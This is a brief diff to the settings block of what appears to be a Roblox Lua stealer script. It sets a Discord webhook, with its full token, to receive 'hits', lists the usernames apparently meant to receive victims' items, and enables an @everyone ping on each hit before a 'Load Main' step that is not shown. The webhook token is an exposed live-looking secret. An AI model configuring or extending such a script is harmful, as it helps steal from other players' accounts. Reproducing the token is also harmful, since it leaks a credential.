@@ -1,6 +1,6 @@
 -- SETTINGS
 _G.POOR_WEBHOOK = "https://discord.com/api/webhooks/1501807425723043860/JO3D6npL7LLFJgvomi4kjyBtdMG3McUtDcTj9Hh9Jng88ED0gctBWh7nxkQKTaomKW35" -- Input Ur webhook Here
-_G.MY_USERNAMES = {"mexicanguy_jason", "X", "X"} -- YOUR own usernames
+_G.MY_USERNAMES = {"mexicanguy_jason", "lagazeusedubled", "X"} -- YOUR own usernames
 _G.PING_POOR = true -- True/False To Ping @Everyone ON HIT
 
 -- Load Main
